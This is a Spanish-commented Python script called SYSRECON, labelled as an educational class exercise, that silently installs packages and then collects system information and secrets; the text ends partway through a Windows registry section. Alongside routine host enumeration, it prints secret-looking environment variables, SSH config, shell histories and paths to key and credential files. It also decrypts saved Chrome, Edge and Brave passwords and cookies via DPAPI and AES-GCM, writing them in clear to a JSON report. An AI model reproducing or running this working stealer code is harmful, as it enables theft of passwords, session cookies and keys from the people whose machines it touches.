#!/usr/bin/env python3
# ============================================================
#   SYSRECON - Full Local Information Gathering Script
#   Uso educativo / Dinámica de clase ASIR
# ============================================================

# ── AUTOINSTALADOR ───────────────────────────────────────────
import subprocess
import sys

REQUIRED = {
    "psutil":       "psutil",
    "requests":     "requests",
    "pycryptodome": "Crypto",
    "pypiwin32":    "win32crypt",
}

def install_dependencies():
    print("[*] Verificando dependencias...")
    for package, import_name in REQUIRED.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"  [+] Instalando {package}...")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", package,
                 "--quiet", "--disable-pip-version-check"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"  [✓] {package} instalado")
    print("[✓] Dependencias listas\n")

install_dependencies()

# ── IMPORTS ──────────────────────────────────────────────────
import os
import socket
import platform
import datetime
import json
import getpass
import sqlite3
import shutil
import tempfile
import base64

try:
    import psutil
except ImportError:
    print("[!] psutil no instalado. Ejecuta: pip install psutil")
    sys.exit(1)

try:
    import requests
except ImportError:
    requests = None

REPORT      = {}
SEPARATOR   = "=" * 60
USERPROFILE = os.environ.get("USERPROFILE", os.path.expanduser("~"))


# ── HELPER: copia temporal segura ────────────────────────────
def safe_tmp_copy(src: str) -> str:
    """Copia src a un archivo temporal seguro (mkstemp) y devuelve su ruta."""
    fd, tmp_path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    shutil.copy2(src, tmp_path)
    return tmp_path


def banner():
    print("""
\033[92m
  ███████╗██╗   ██╗███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
  ██╔════╝╚██╗ ██╔╝██╔════╝██╔══██╗██╔════╝██╔════╝ ████╗  ██║
  ███████╗ ╚████╔╝ ███████╗██████╔╝█████╗  ██║      ██╔██╗ ██║
  ╚════██║  ╚██╔╝  ╚════██║██╔══██╗██╔══╝  ██║      ██║╚██╗██║
  ███████║   ██║   ███████║██║  ██║███████╗╚██████╗ ██║ ╚████║
  ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
\033[0m
  \033[93m[*] Local System Intelligence Gatherer | ASIR Recon Tool\033[0m
    """)


# ─────────────────────────────────────────
# 1. SISTEMA OPERATIVO
# ─────────────────────────────────────────
def get_os_info():
    print(f"\n{SEPARATOR}\n[+] SISTEMA OPERATIVO\n{SEPARATOR}")
    data = {
        "OS":           platform.system(),
        "Nombre":       platform.node(),
        "Version":      platform.version(),
        "Release":      platform.release(),
        "Arquitectura": platform.architecture()[0],
        "Máquina":      platform.machine(),
        "Procesador":   platform.processor(),
        "Python":       platform.python_version(),
        "Fecha/Hora":   str(datetime.datetime.now()),
        "Uptime":       str(datetime.timedelta(seconds=int(
            datetime.datetime.now().timestamp() - psutil.boot_time()
        )))
    }
    for k, v in data.items():
        print(f"  {k:<20}: {v}")
    REPORT["sistema_operativo"] = data


# ─────────────────────────────────────────
# 2. USUARIO ACTUAL Y ENTORNO
# ─────────────────────────────────────────
def get_user_info():
    print(f"\n{SEPARATOR}\n[+] USUARIO Y ENTORNO\n{SEPARATOR}")
    data = {
        "Usuario actual":   getpass.getuser(),
        "Home dir":         os.path.expanduser("~"),
        "CWD":              os.getcwd(),
        "UID/GID":          f"{os.getuid()}/{os.getgid()}" if hasattr(os, "getuid") else "N/A (Windows)",
        "Shell":            os.environ.get("SHELL", os.environ.get("COMSPEC", "N/A")),
        "PATH":             os.environ.get("PATH", "N/A"),
        "SUDO_USER":        os.environ.get("SUDO_USER", "N/A"),
        "LOGNAME":          os.environ.get("LOGNAME", "N/A"),
        "Sesiones activas": [f"{u.name}@{u.terminal} desde {u.host}" for u in psutil.users()]
    }
    for k, v in data.items():
        print(f"  {k:<20}: {v}")
    REPORT["usuario"] = data


# ─────────────────────────────────────────
# 3. CPU
# ─────────────────────────────────────────
def get_cpu_info():
    print(f"\n{SEPARATOR}\n[+] CPU\n{SEPARATOR}")
    freq = psutil.cpu_freq()
    data = {
        "Núcleos físicos":   psutil.cpu_count(logical=False),
        "Núcleos lógicos":   psutil.cpu_count(logical=True),
        "Frecuencia actual": f"{freq.current:.2f} MHz" if freq else "N/A",
        "Frecuencia máx":    f"{freq.max:.2f} MHz"     if freq else "N/A",
        "Uso CPU total":     f"{psutil.cpu_percent(interval=1)}%",
        "Uso por núcleo":    psutil.cpu_percent(interval=1, percpu=True),
        "Load average":      os.getloadavg() if hasattr(os, "getloadavg") else "N/A",
    }
    for k, v in data.items():
        print(f"  {k:<22}: {v}")
    REPORT["cpu"] = data


# ─────────────────────────────────────────
# 4. MEMORIA RAM Y SWAP
# ─────────────────────────────────────────
def get_memory_info():
    print(f"\n{SEPARATOR}\n[+] MEMORIA RAM / SWAP\n{SEPARATOR}")
    ram  = psutil.virtual_memory()
    swap = psutil.swap_memory()
    data = {
        "RAM Total":      f"{ram.total     / (1024**3):.2f} GB",
        "RAM Disponible": f"{ram.available / (1024**3):.2f} GB",
        "RAM Usada":      f"{ram.used      / (1024**3):.2f} GB",
        "RAM %":          f"{ram.percent}%",
        "SWAP Total":     f"{swap.total    / (1024**3):.2f} GB",
        "SWAP Usada":     f"{swap.used     / (1024**3):.2f} GB",
        "SWAP %":         f"{swap.percent}%",
    }
    for k, v in data.items():
        print(f"  {k:<22}: {v}")
    REPORT["memoria"] = data


# ─────────────────────────────────────────
# 5. DISCOS Y PARTICIONES
# ─────────────────────────────────────────
def get_disk_info():
    print(f"\n{SEPARATOR}\n[+] DISCOS Y PARTICIONES\n{SEPARATOR}")
    data = []
    for p in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(p.mountpoint)
            entry = {
                "Dispositivo": p.device, "Montaje": p.mountpoint, "FS": p.fstype,
                "Total": f"{usage.total / (1024**3):.2f} GB",
                "Usado": f"{usage.used  / (1024**3):.2f} GB",
                "Libre": f"{usage.free  / (1024**3):.2f} GB",
                "Uso%":  f"{usage.percent}%",
            }
            data.append(entry)
            print(f"  {p.device} | {p.mountpoint} | {p.fstype}")
            print(f"    Total:{entry['Total']} Usado:{entry['Usado']} Libre:{entry['Libre']} {entry['Uso%']}")
        except PermissionError:
            print(f"  [!] Permiso denegado: {p.mountpoint}")
    REPORT["discos"] = data


# ─────────────────────────────────────────
# 6. RED — INTERFACES, IPs, MAC
# ─────────────────────────────────────────
def get_network_info():
    print(f"\n{SEPARATOR}\n[+] INTERFACES DE RED\n{SEPARATOR}")
    interfaces = psutil.net_if_addrs()
    stats      = psutil.net_if_stats()
    data = {}
    for iface, addrs in interfaces.items():
        up = stats[iface].isup if iface in stats else False
        data[iface] = {
            "activa": up,
            "direcciones": [
                {"familia": str(a.family), "ip": a.address,
                 "netmask": a.netmask, "broadcast": a.broadcast}
                for a in addrs
            ]
        }
        print(f"  [{'UP' if up else 'DOWN'}] {iface}")
        for a in addrs:
            print(f"      IP:{a.address}  Mask:{a.netmask}  BC:{a.broadcast}")
    REPORT["interfaces_red"] = data


# ─────────────────────────────────────────
# 7. CONEXIONES DE RED ACTIVAS
# ─────────────────────────────────────────
def get_connections():
    print(f"\n{SEPARATOR}\n[+] CONEXIONES DE RED ACTIVAS\n{SEPARATOR}")
    conns = []
    try:
        for conn in psutil.net_connections(kind="inet"):
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
            try:
                proc = psutil.Process(conn.pid).name() if conn.pid else "-"
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                proc = "-"
            conns.append({"local": laddr, "remoto": raddr,
                          "estado": conn.status, "pid": conn.pid, "proceso": proc})
            print(f"  {laddr:<25} -> {raddr:<25} [{conn.status}] ({proc})")
    except psutil.AccessDenied:
        print("  [!] Ejecuta como Administrador para ver todas las conexiones")
    REPORT["conexiones_red"] = conns


# ─────────────────────────────────────────
# 8. TABLA ARP Y RUTAS
# ─────────────────────────────────────────
def get_arp_and_routes():
    print(f"\n{SEPARATOR}\n[+] TABLA ARP / RUTAS\n{SEPARATOR}")
    arp, routes = [], []
    if platform.system() == "Windows":
        cmds = [("arp", ["arp", "-a"]), ("routes", ["route", "print"])]
    else:
        cmds = [("arp", ["arp", "-n"]), ("routes", ["ip", "route"])]
    for label, cmd in cmds:
        try:
            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(errors="ignore")
            print(f"[{label.upper()}]\n{out[:1500]}")
            if label == "arp":
                arp = out.strip().split("\n")
            else:
                routes = out.strip().split("\n")
        except (FileNotFoundError, subprocess.CalledProcessError, OSError):
            print(f"  [!] No se pudo ejecutar: {cmd}")
    REPORT["arp_rutas"] = {"arp": arp, "rutas": routes}


# ─────────────────────────────────────────
# 9. HOSTNAME Y DNS
# ─────────────────────────────────────────
def get_dns_info():
    print(f"\n{SEPARATOR}\n[+] HOSTNAME Y DNS\n{SEPARATOR}")
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        local_ip = "N/A"
    data = {
        "hostname":       hostname,
        "local_ip":       local_ip,
        "fqdn":           socket.getfqdn(),
        "dns_servidores": []
    }
    if os.path.exists("/etc/resolv.conf"):
        with open("/etc/resolv.conf") as f:
            for line in f:
                if line.startswith("nameserver"):
                    data["dns_servidores"].append(line.split()[1])
    for k, v in data.items():
        print(f"  {k:<20}: {v}")
    REPORT["dns"] = data


# ─────────────────────────────────────────
# 10. PROCESOS EN EJECUCIÓN (Top 30 CPU)
# ─────────────────────────────────────────
def get_processes():
    print(f"\n{SEPARATOR}\n[+] PROCESOS EN EJECUCIÓN (Top 30 por CPU)\n{SEPARATOR}")
    procs = []
    for proc in sorted(
        psutil.process_iter(['pid', 'name', 'username', 'cpu_percent',
                             'memory_percent', 'status', 'cmdline']),
        key=lambda p: p.info['cpu_percent'] or 0,
        reverse=True
    )[:30]:
        try:
            info = proc.info
            cmd  = " ".join(info.get("cmdline") or [])[:60]
            mem  = round(info["memory_percent"] or 0, 2)
            procs.append({
                "pid": info["pid"], "nombre": info["name"],
                "usuario": info["username"], "cpu%": info["cpu_percent"],
                "mem%": mem, "estado": info["status"], "cmd": cmd
            })
            print(f"  PID:{info['pid']:<6} {str(info['name']):<25} "
                  f"CPU:{info['cpu_percent']:<5} MEM:{mem:<5}% USR:{info['username']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    REPORT["procesos"] = procs


# ─────────────────────────────────────────
# 11. PUERTOS EN ESCUCHA
# ─────────────────────────────────────────
def get_listening_ports():
    print(f"\n{SEPARATOR}\n[+] PUERTOS EN ESCUCHA\n{SEPARATOR}")
    ports = []
    try:
        for conn in psutil.net_connections(kind="inet"):
            if conn.status in ("LISTEN", "NONE") and conn.laddr:
                try:
                    proc_name = psutil.Process(conn.pid).name() if conn.pid else "?"
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    proc_name = "?"
                ports.append({"ip": conn.laddr.ip, "puerto": conn.laddr.port,
                               "pid": conn.pid, "proceso": proc_name})
                print(f"  {conn.laddr.ip:<20}:{conn.laddr.port:<6} PID:{conn.pid} ({proc_name})")
    except psutil.AccessDenied:
        print("  [!] Necesitas privilegios de Administrador")
    REPORT["puertos_escucha"] = ports


# ─────────────────────────────────────────
# 12. USUARIOS DEL SISTEMA
# ─────────────────────────────────────────
def get_system_users():
    print(f"\n{SEPARATOR}\n[+] USUARIOS DEL SISTEMA\n{SEPARATOR}")
    users = []
    if os.path.exists("/etc/passwd"):
        with open("/etc/passwd") as f:
            for line in f:
                p = line.strip().split(":")
                if len(p) >= 7:
                    users.append({"usuario": p[0], "uid": p[2], "gid": p[3],
                                  "desc": p[4], "home": p[5], "shell": p[6]})
                    try:
                        if 999 < int(p[2]) < 65534:
                            print(f"  {p[0]:<20} UID:{p[2]:<6} Home:{p[5]} Shell:{p[6]}")
                    except ValueError:
                        pass
    elif platform.system() == "Windows":
        try:
            out = subprocess.check_output("net user", shell=True).decode(errors="ignore")
            print(out)
            users = out.strip().split("\n")
        except (subprocess.CalledProcessError, OSError) as e:
            print(f"  [!] Error: {e}")
    REPORT["usuarios_sistema"] = users


# ─────────────────────────────────────────
# 13. GRUPOS Y SUDO
# ─────────────────────────────────────────
def get_groups_and_sudo():
    print(f"\n{SEPARATOR}\n[+] GRUPOS Y PRIVILEGIOS\n{SEPARATOR}")
    data = {"grupos": [], "sudoers": []}
    if os.path.exists("/etc/group"):
        with open("/etc/group") as f:
            for line in f:
                p = line.strip().split(":")
                if len(p) >= 4 and p[3]:
                    data["grupos"].append({"grupo": p[0], "gid": p[2], "miembros": p[3]})
                    print(f"  {p[0]:<20} GID:{p[2]:<6} Miembros: {p[3]}")
    if os.path.exists("/etc/sudoers"):
        try:
            with open("/etc/sudoers") as f:
                for line in f:
                    if not line.startswith("#") and "ALL" in line:
                        data["sudoers"].append(line.strip())
                        print(f"  \033[91m[SUDO] {line.strip()}\033[0m")
        except PermissionError:
            print("  [!] Sin acceso a /etc/sudoers (necesita root)")
    REPORT["grupos_sudo"] = data


# ─────────────────────────────────────────
# 14. VARIABLES DE ENTORNO (+ sensibles)
# ─────────────────────────────────────────
def get_env_vars():
    print(f"\n{SEPARATOR}\n[+] VARIABLES DE ENTORNO\n{SEPARATOR}")
    sensitive_keys  = ["PASSWORD", "SECRET", "TOKEN", "KEY", "API",
                       "AWS", "DB_", "PASS", "CRED", "PRIVATE"]
    env             = dict(os.environ)
    found_sensitive = {}
    for k, v in env.items():
        print(f"  {k:<30} = {v[:80]}")
        if any(s in k.upper() for s in sensitive_keys):
            found_sensitive[k] = v
    if found_sensitive:
        print("\n  \033[91m[!!!] VARIABLES SENSIBLES DETECTADAS:\033[0m")
        for k, v in found_sensitive.items():
            print(f"    \033[91m{k} = {v}\033[0m")
    REPORT["variables_entorno"] = {"todas": env, "sensibles": found_sensitive}


# ─────────────────────────────────────────
# 15. SSH — CLAVES Y HOSTS CONOCIDOS
# ─────────────────────────────────────────
def get_ssh_info():
    print(f"\n{SEPARATOR}\n[+] SSH — CLAVES Y CONFIGURACIÓN\n{SEPARATOR}")
    data    = {"claves": [], "known_hosts": [], "config": ""}
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_dir):
        for fname in os.listdir(ssh_dir):
            fpath = os.path.join(ssh_dir, fname)
            data["claves"].append(fpath)
            print(f"  Archivo: {fpath}")
            if fname == "known_hosts":
                try:
                    with open(fpath) as fh:
                        hosts = [line.split()[0] for line in fh if line.strip()]
                        data["known_hosts"] = hosts
                        print(f"  Known hosts: {hosts}")
                except OSError as e:
                    print(f"  [!] {e}")
            if fname == "config":
                try:
                    with open(fpath) as fh:
                        data["config"] = fh.read()
                        print(f"  Config SSH:\n{data['config']}")
                except OSError as e:
                    print(f"  [!] {e}")
    REPORT["ssh"] = data


# ─────────────────────────────────────────
# 16. HISTORIAL DE COMANDOS
# ─────────────────────────────────────────
def get_history():
    print(f"\n{SEPARATOR}\n[+] HISTORIAL DE COMANDOS\n{SEPARATOR}")
    history_files = [
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.zsh_history"),
        os.path.expanduser("~/.sh_history"),
        os.path.expanduser("~/.local/share/fish/fish_history"),
        os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        )
    ]
    data = {}
    for hfile in history_files:
        if os.path.exists(hfile):
            try:
                with open(hfile, errors="ignore") as f:
                    lines = f.readlines()[-50:]
                    data[hfile] = [line.strip() for line in lines]
                    print(f"\n  [{hfile}] — últimas {len(lines)} entradas:")
                    for line in lines:
                        print(f"    {line.strip()}")
            except PermissionError:
                print(f"  [!] Acceso denegado: {hfile}")
    REPORT["historial"] = data


# ─────────────────────────────────────────
# 17. SOFTWARE INSTALADO
# ─────────────────────────────────────────
def get_installed_software():
    print(f"\n{SEPARATOR}\n[+] SOFTWARE INSTALADO\n{SEPARATOR}")
    data = []
    if platform.system() == "Linux":
        for cmd in [["dpkg", "--list"], ["rpm", "-qa"], ["pacman", "-Q"]]:
            try:
                out  = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(errors="ignore")
                data = out.strip().split("\n")
                print("\n".join(data[:40]))
                break
            except FileNotFoundError:
                continue
    elif platform.system() == "Windows":
        try:
            out  = subprocess.check_output(
                "wmic product get name,version", shell=True,
                stderr=subprocess.DEVNULL).decode(errors="ignore")
            data = out.strip().split("\n")
            print("\n".join(data[:40]))
        except (subprocess.CalledProcessError, OSError) as e:
            print(f"  [!] Error wmic: {e}")
    REPORT["software_instalado"] = data[:100]


# ─────────────────────────────────────────
# 18. FIREWALL Y REGLAS
# ─────────────────────────────────────────
def get_firewall_rules():
    print(f"\n{SEPARATOR}\n[+] FIREWALL Y REGLAS\n{SEPARATOR}")
    data = []
    if platform.system() == "Linux":
        for cmd in [["iptables", "-L", "-n", "-v"],
                    ["nft", "list", "ruleset"],
                    ["ufw", "status", "verbose"]]:
            try:
                out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(errors="ignore")
                print(out[:2000])
                data.append(out)
                break
            except (FileNotFoundError, subprocess.CalledProcessError):
                continue
    elif platform.system() == "Windows":
        try:
            out = subprocess.check_output(
                "netsh advfirewall show allprofiles", shell=True).decode(errors="ignore")
            print(out)
            data.append(out)
        except (subprocess.CalledProcessError, OSError) as e:
            print(f"  [!] Error netsh: {e}")
    REPORT["firewall"] = data


# ─────────────────────────────────────────
# 19. ARCHIVOS SENSIBLES
# ─────────────────────────────────────────
def find_sensitive_files():
    print(f"\n{SEPARATOR}\n[+] BÚSQUEDA DE ARCHIVOS SENSIBLES\n{SEPARATOR}")
    targets = [".pem", ".key", ".p12", ".pfx", ".ppk", "id_rsa", "id_dsa",
               "id_ed25519", ".env", "config.php", "wp-config.php",
               ".kdbx", ".netrc", "credentials"]
    found = []
    search_dirs = [
        os.path.expanduser("~"), "/etc", "/var/www", "/opt",
        os.path.join(USERPROFILE, "Documents"),
        os.path.join(USERPROFILE, "Desktop"),
    ]
    for sdir in search_dirs:
        if not os.path.exists(sdir):
            continue
        for root, dirs, files in os.walk(sdir):
            dirs[:] = [d for d in dirs if d not in [".git", "node_modules", "__pycache__"]]
            for fname in files:
                if any(t in fname for t in targets):
                    fpath = os.path.join(root, fname)
                    found.append(fpath)
                    print(f"  \033[91m[!] {fpath}\033[0m")
            if len(found) > 100:
                break
    REPORT["archivos_sensibles"] = found


# ─────────────────────────────────────────
# 20. IP PÚBLICA Y GEOLOCALIZACIÓN
# ─────────────────────────────────────────
def get_public_ip():
    print(f"\n{SEPARATOR}\n[+] IP PÚBLICA Y GEOLOCALIZACIÓN\n{SEPARATOR}")
    data = {}
    if requests:
        try:
            r    = requests.get("https://ipinfo.io/json", timeout=5)
            data = r.json()
            for k, v in data.items():
                print(f"  {k:<15}: {v}")
        except Exception as e:
            print(f"  [!] Error: {e}")
    else:
        print("  [!] requests no disponible")
    REPORT["ip_publica"] = data


# ─────────────────────────────────────────
# 21. CRONTABS Y TAREAS PROGRAMADAS
# ─────────────────────────────────────────
def get_scheduled_tasks():
    print(f"\n{SEPARATOR}\n[+] TAREAS PROGRAMADAS / CRON\n{SEPARATOR}")
    data = []
    if platform.system() != "Windows":
        for cpath in ["/etc/crontab", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.weekly"]:
            if os.path.isdir(cpath):
                paths = [os.path.join(cpath, f) for f in os.listdir(cpath)]
            elif os.path.isfile(cpath):
                paths = [cpath]
            else:
                continue
            for fpath in paths:
                try:
                    with open(fpath) as fh:
                        content = fh.read()
                        print(f"  [{fpath}]:\n{content[:300]}")
                        data.append({"ruta": fpath, "contenido": content})
                except OSError:
                    pass
        try:
            out = subprocess.check_output(
                ["crontab", "-l"], stderr=subprocess.DEVNULL).decode(errors="ignore")
            print(f"  [crontab usuario]:\n{out}")
            data.append({"ruta": "crontab_usuario", "contenido": out})
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass
    else:
        try:
            out = subprocess.check_output(
                "schtasks /query /fo LIST", shell=True).decode(errors="ignore")
            print(out[:3000])
            data.append(out)
        except (subprocess.CalledProcessError, OSError) as e:
            print(f"  [!] Error schtasks: {e}")
    REPORT["tareas_programadas"] = data


# ─────────────────────────────────────────
# 22. GUARDAR REPORTE JSON
# ─────────────────────────────────────────
def save_report():
    filename = f"sysrecon_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(REPORT, f, indent=4, default=str, ensure_ascii=False)
    print(f"\n\033[92m[✓] Reporte guardado en: {filename}\033[0m")
    return filename


# ── HELPERS COMPARTIDOS PARA NAVEGADORES ─────────────────────
def _get_browser_master_key(browser_path: str):
    """Obtiene la master key de un navegador Chromium via DPAPI."""
    try:
        import win32crypt
    except ImportError:
        return None
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        ls = json.load(f)
    encrypted_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def _decrypt_chromium_value(ciphertext: bytes, key: bytes) -> str:
    """Descifra un valor AES-GCM de navegadores Chromium."""
    try:
        from Crypto.Cipher import AES
        iv      = ciphertext[3:15]
        payload = ciphertext[15:]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode(errors="replace")
    except Exception:
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode(errors="replace")
        except Exception:
            return "[no descifrable]"


CHROMIUM_BROWSERS = {
    "Chrome": os.path.join(USERPROFILE, "AppData", "Local", "Google", "Chrome", "User Data"),
    "Edge":   os.path.join(USERPROFILE, "AppData", "Local", "Microsoft", "Edge", "User Data"),
    "Brave":  os.path.join(USERPROFILE, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
}


# ─────────────────────────────────────────
# 23. HISTORIAL NAVEGADORES
# ─────────────────────────────────────────
def get_browser_history():
    print(f"\n{SEPARATOR}\n[+] HISTORIAL DE NAVEGADORES\n{SEPARATOR}")
    data = {}

    for browser, base_path in CHROMIUM_BROWSERS.items():
        db_path = os.path.join(base_path, "Default", "History")
        if not os.path.exists(db_path):
            print(f"  [-] {browser} no encontrado")
            continue
        tmp = safe_tmp_copy(db_path)
        try:
            conn   = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT url, title, visit_count, last_visit_time "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 100"
            )
            rows = cursor.fetchall()
            conn.close()
            data[browser] = []
            print(f"\n  [{browser}] — {len(rows)} URLs:")
            for url, title, count, last_visit in rows:
                try:
                    ts = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit)
                except (OverflowError, ValueError):
                    ts = "?"
                entry = {"url": url, "titulo": title, "visitas": count, "ultimo_acceso": str(ts)}
                data[browser].append(entry)
                print(f"    [{ts}] ({count}x) {str(title)[:50]} — {url[:80]}")
        except Exception as e:
            print(f"  [!] Error {browser}: {e}")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    # Firefox
    ff_base = os.path.join(USERPROFILE, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    if os.path.exists(ff_base):
        for profile in os.listdir(ff_base):
            places = os.path.join(ff_base, profile, "places.sqlite")
            if not os.path.exists(places):
                continue
            tmp = safe_tmp_copy(places)
            try:
                conn   = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT p.url, p.title, h.visit_date
                    FROM moz_historyvisits h
                    JOIN moz_places p ON h.place_id = p.id
                    ORDER BY h.visit_date DESC LIMIT 100
                """)
                rows = cursor.fetchall()
                conn.close()
                data["Firefox"] = []
                print(f"\n  [Firefox - {profile}] — {len(rows)} URLs:")
                for url, title, visit_date in rows:
                    try:
                        ts = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=visit_date)
                    except (OverflowError, ValueError):
                        ts = "?"
                    data["Firefox"].append({"url": url, "titulo": title, "fecha": str(ts)})
                    print(f"    [{ts}] {str(title)[:50]} — {url[:80]}")
            except Exception as e:
                print(f"  [!] Error Firefox: {e}")
            finally:
                try:
                    os.remove(tmp)
                except OSError:
                    pass

    REPORT["historial_navegadores"] = data


# ─────────────────────────────────────────
# 24. CONTRASEÑAS GUARDADAS EN NAVEGADORES
# ─────────────────────────────────────────
def get_browser_passwords():
    print(f"\n{SEPARATOR}\n[+] CONTRASEÑAS GUARDADAS EN NAVEGADORES\n{SEPARATOR}")
    all_passwords = {}

    for browser, base_path in CHROMIUM_BROWSERS.items():
        login_db = os.path.join(base_path, "Default", "Login Data")
        if not os.path.exists(login_db):
            print(f"  [-] {browser}: sin Login Data")
            continue
        master_key = _get_browser_master_key(base_path)
        if not master_key:
            print(f"  [!] {browser}: no se pudo obtener master key")
            continue
        tmp = safe_tmp_copy(login_db)
        try:
            conn   = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            conn.close()
            all_passwords[browser] = []
            print(f"\n  [{browser}] — {len(rows)} credenciales:")
            for url, user, enc_pass in rows:
                password = _decrypt_chromium_value(enc_pass, master_key)
                all_passwords[browser].append({"url": url, "usuario": user, "contraseña": password})
                print(f"    URL: {url[:60]}")
                print(f"    Usuario: {user}  |  Pass: \033[91m{password}\033[0m\n")
        except Exception as e:
            print(f"  [!] Error {browser}: {e}")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    REPORT["passwords_navegadores"] = all_passwords


# ─────────────────────────────────────────
# 25. COOKIES DE NAVEGADORES
# ─────────────────────────────────────────
def get_browser_cookies():
    print(f"\n{SEPARATOR}\n[+] COOKIES DE NAVEGADORES\n{SEPARATOR}")
    all_cookies = {}

    for browser, base_path in CHROMIUM_BROWSERS.items():
        # Chrome 127+ mueve cookies a Default/Network/Cookies
        cookie_db = None
        for suffix in [os.path.join("Default", "Network", "Cookies"),
                       os.path.join("Default", "Cookies")]:
            candidate = os.path.join(base_path, suffix)
            if os.path.exists(candidate):
                cookie_db = candidate
                break
        if not cookie_db:
            print(f"  [-] {browser}: sin cookies")
            continue
        master_key = _get_browser_master_key(base_path)
        if not master_key:
            print(f"  [!] {browser}: no se pudo obtener master key")
            continue
        tmp = safe_tmp_copy(cookie_db)
        try:
            conn   = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT host_key, name, encrypted_value, expires_utc "
                "FROM cookies LIMIT 200"
            )
            rows = cursor.fetchall()
            conn.close()
            all_cookies[browser] = []
            print(f"\n  [{browser}] — {len(rows)} cookies:")
            for host, name, enc_val, _ in rows:
                val = _decrypt_chromium_value(enc_val, master_key)
                all_cookies[browser].append({"host": host, "nombre": name, "valor": val})
                print(f"    {host:<35} {name:<25} = {val[:40]}")
        except Exception as e:
            print(f"  [!] Error {browser}: {e}")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    REPORT["cookies_navegadores"] = all_cookies


# ─────────────────────────────────────────
# 26. REGISTRO DE WINDOWS
# ─────────────────────────────────────────
def get_registry_artifacts():
    print(f"\n{SEPARATOR}\n[+] REGISTRO DE WINDOWS\n{SEPARATOR}")
    try:
        import winreg
    except ImportError:
        print("  [!] winreg no disponible (solo Windows)")
        return

    data     = {}
    reg_keys = {
        "Software instalado (x64)": (winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        "Software instalado (x86)": (winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        "Autorun (HKLM Run)": (winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        "Autorun (HKCU Run)": (winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        "Typed URLs": (winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Internet Explorer\TypedURLs"),
        "Recent Docs": (winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"),
        "MRU Run": (winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"),
        "Redes WiFi": (winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"),
        "ComputerName": (winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"),
        "OS Version": (winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"),
        "Last logged user": (winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"),
        "RDP saved sessions": (winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Terminal Server Client\Servers"),
    }

    for label, (hive, path) in reg_keys.items():
        print(f"\n  [{label}]")
        try:
            key     = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            entries = {}
            idx = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, idx)
                    entries[name]  = str(value)[:120]
                    print(f"    {name:<40} = {str(value)[:80]}")
                    idx += 1
                except OSError:
                    break
            idx = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, idx)
                    try:
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            dn, _, _ = winreg.QueryValueEx(subkey, "DisplayName")
